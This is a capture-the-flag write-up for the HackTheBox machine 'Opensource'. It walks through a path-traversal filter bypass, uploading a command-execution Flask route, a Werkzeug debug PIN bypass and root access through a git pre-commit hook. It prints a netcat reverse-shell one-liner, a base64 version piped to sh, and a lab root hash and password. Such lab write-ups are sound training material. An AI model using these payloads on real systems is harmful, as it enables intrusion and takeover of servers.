# HackTheBox - Opensource

## NMAP

```bash
PORT     STATE    SERVICE VERSION       
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)                              
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)                                  
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)                         
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sat, 21 May 2022 19:02:18 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script> 
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: upcloud - Upload files for Free!
3000/tcp filtered ppp    

```

## PORT 80 (HTTP)
The webserver was hosting something called `upcloud`

<img src="https://i.imgur.com/E3ddP3A.png"/>

Since it's using `Werkzeug` chances are that we may have access to `console`

<img src="https://i.imgur.com/GLqIwnX.png"/>

But this was protected by a PIN so let's move on to explore what options we have on the site.

We have an option to upload files also to download the source code

<img src="https://i.imgur.com/ZXe1WEN.png"/>

Looking at the source code we have git repo of the file

<img src="https://i.imgur.com/qmUh1Qd.png"/>

So the first thing that I usually check is for git logs

<img src="https://i.imgur.com/DxTNJfz.png"/>

We have two commits made in this repo, the latest one just shows that the application was running in debug mode but now is running in production so nothing really in the commits

<img src="https://i.imgur.com/OOtVVV1.png"/>

Running `git branch` showed that there was another branch named `dev` and we were currenlty viewing  `public`

<img src="https://i.imgur.com/m6wldoE.png"/>

Switching the branch with `git switch dev`

<img src="https://i.imgur.com/SBtQ7my.png"/>

And checking the commits made in this branch we get credentials for `dev01` which we maybe able to use it somewhere else

<img src="https://i.imgur.com/75PyA9d.png"/>

<img src="https://i.imgur.com/GUj8FjF.png"/>

Checking the source code from the public branch

<img src="https://i.imgur.com/TfAGgzX.png"/>

In `views.py`, we can see that it has a functionality to upload files in the directory `uploads`  and in the `upload_file` function it's calling another function from `utils.py` named `get_file_name` 

<img src="https://i.imgur.com/l4eXBwY.png"/>

<img src="https://i.imgur.com/GADebrV.png"/>

This function is being used for sanitzing file name incase of a LFI (Local File Inclusion) and it's being called recursively

<img src="https://i.imgur.com/QuSTKfb.png"/>

After the file name is sanitzed and uploaded, we can access it through `/uploads/filename`

<img src="https://i.imgur.com/iQNts10.png"/>

But it's using `os.join.path`  which is vulnerable to path traversal if there's an absolute path being used it will ignore the basepath

<img src="https://i.imgur.com/WgJfaUV.png"/>

<img src="https://i.imgur.com/DAbqxzA.png"/>


We can try for LFI here but it's not going to work as the function `get_file_name` is removing `../`  recursively


<img src="https://i.imgur.com/KoBTFmw.png"/>

We can bypass this as Werkzeug will normalize `//upcloud` to `/upcloud`

<img src="https://i.imgur.com/XZtQjsD.png"/>

So we can provide `..//etc/passwd` which will bypass the filter`

<img src="https://i.imgur.com/hXgNrcX.png"/>

Also we can fuzz for the LFI payload using `LFI-Jhaddix.txt` from seclists

```bash
wfuzz -c -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt  -u 'http://10.10.11.164/uploads/FUZZ' --hl 254,5
```

<img src="https://i.imgur.com/3fWNxnp.png"/>

Which url decodes to `../../..//../../etc/passwd` which bypasses the recursive search for `../`

<img src="https://i.imgur.com/J6kyccR.png"/>


<img src="https://i.imgur.com/LLf2Pf5.png"/>


## Foothold (Method 1)
Checking the upload functionality we can upload files and can rewrite files on the server meaning that we need to replace views.py with our own route for executing commands since the server is running in debug mode and it will restart the server on detecting changes , I tested this locally and it was working

<img src="https://i.imgur.com/cP0TPhK.png"/>

<img src="https://i.imgur.com/4YWtnvL.png"/>

I added a route in the file for executing commands

<img src="https://i.imgur.com/uDpuxXN.png"/>

```python
def run_command(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()

@app.route('/<command>')
def command_server(command):
    return run_command(command)
```

Intercepting the request to upload a file 

<img src="https://i.imgur.com/XIg4kct.png"/>

Now changing the filename to `/..//../app/app/views.py` this replace views.py which is on the server

<img src="https://i.imgur.com/deYgXCV.png"/>

<img src="https://i.imgur.com/w1BAoE6.png"/>

<img src="https://i.imgur.com/wt8W7p6.png"/>

I checked if `nc` was on the target machine

<img src="https://i.imgur.com/t3lRxlb.png"/>

We can just a openbsd nc reverse shell payload by encoding it to base64 and piping it to `sh` since `bash` wasn't there

```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.96 3333 >/tmp/f
```

```
echo 'cm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuOTYgMzMzMyA+L3RtcC9mCg==' | base64 -d | sh
```

<img src="https://i.imgur.com/9oT2uEU.png"/>

## Foothold (Method 2)

We can get foothold by generating the console PIN using the exploit from here

https://github.com/wdahlenburg/werkzeug-debug-console-bypass

Replacing the values  in  the exploit by reading the MAC from `/sys/class/net/eth0/address`,  boot-id from `/proc/sys/kernel/random/boot_id` and cgroup from `/proc/self/cgroup` also replacing the path to flask app , modname and the user running this flask app

We can get the MAC address through the LFI we found and convert it to decimal

<img src="https://i.imgur.com/3nWMOfg.png"/>

```python
mac = "02:42:ac:11:00:02"
int(mac.replace(":", ""), 16)
```

<img src="https://i.imgur.com/Ua6bEbV.png"/>

Reading the boot_id

<img src="https://i.imgur.com/P397oL7.png"/>

And the cgroup file

<img src="https://i.imgur.com/RuSQIOl.png"/>

Combine the both boot_id and cgroup

<img src="https://i.imgur.com/9LqUWI2.png"/>

Now we just need to replace the values in pin generation script

https://github.com/wdahlenburg/werkzeug-debug-console-bypass/blob/main/werkzeug-pin-bypass.py

<img src="https://i.imgur.com/XybNKU6.png"/>

Running the script we'll get a pin 

<img src="https://i.imgur.com/j0cHiAa.png"/>

<img src="https://i.imgur.com/Z5Upyiu.png"/>

## Privilege Escalation (dev01)

After getting a shell on the container, there wasn't anything, I ran pspy, linpeas but nothing came out of interest, but if check our nmap scan there was port 3000 which was filtered, since we are on a container the gateway is usually the host machine

So running an nmap through the container (by using a statically compiled binary of nmap )

<img src="https://i.imgur.com/Ldf27nS.png"/>

We can use `chisel` to port forward this (by of course transferring on the container)

<img src="https://i.imgur.com/sZ47gTz.png"/>

<img src="https://i.imgur.com/jrSuzkc.png"/>

Here we can use the credentials found from the dev branch

<img src="https://i.imgur.com/CuDu0xY.png"/>

In this repo we can get the ssh key for dev01 user

<img src="https://i.imgur.com/vwAvZSw.png"/>

<img src="https://i.imgur.com/YvMGcpO.png"/>

## Privilege Escalation (root)

Transferring pspy for mointoring background processes we can see `git-sync` being ran as a root user

<img src="https://i.imgur.com/W6YAwRI.png"/>

Reading this script

```bash
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi

```

It just detects if there are any changes in dev01's home directory and if there are it adds that file into the repo and makes a commit

We can't really do exploit this script but I came across an article on exploiting git hooks

https://medium.com/@knownsec404team/analysis-of-cve-2019-11229-from-git-config-to-rce-32c217727baa

Which abuses git hooks, this wasn't really the exact scenario here but it gave me an idea to abuse git hooks, so we can include a git hook script in `.git/hooks` and we want `pre-commit` script 

<img src="https://i.imgur.com/37hCG0A.png"/>

We can include a `pre-commit` script which will run before the commit is made

<img src="https://i.imgur.com/cW51fEk.png"/>

<img src="https://i.imgur.com/nLjSjxB.png"/>

And now waiting for the git-sync to ran which will then trigger this pre-commit script and give us a root shell

<img src="https://i.imgur.com/y8a3U76.png"/>


## References
- https://stackoverflow.com/questions/62416577/execute-linux-command-in-python-flask
- https://github.com/wdahlenburg/werkzeug-debug-console-bypass
- https://medium.com/@knownsec404team/analysis-of-cve-2019-11229-from-git-config-to-rce-32c217727baa
- https://www.atlassian.com/git/tutorials/git-hooks

```
/uploads/..//../dev/stdout


mac : 02:42:ac:11:00:02
/sys/class/net/eth0/address
boot_id : f40f0d09-2ab1-49df-9fa4-dbe308cef90b(/proc/sys/kernel/random/boot_id)
cgroup : a418bab07494d0d7a855c962dd8b58fa0182974af5315272161a68c04bf9808a (/proc/self/cgroup)

root:$6$5sA85UVX$HupltM.bMqXkLc269pHDk1lryc4y5LV0FPMtT3x.yUdbe3mGziC8aUXWRQ2K3jX8mq5zItFAkAfDgPzH8EQ1C/:19072:0:99999:7:::

dev01:Soulless_Developer#2022

/usr/local/bin/git-sync
```
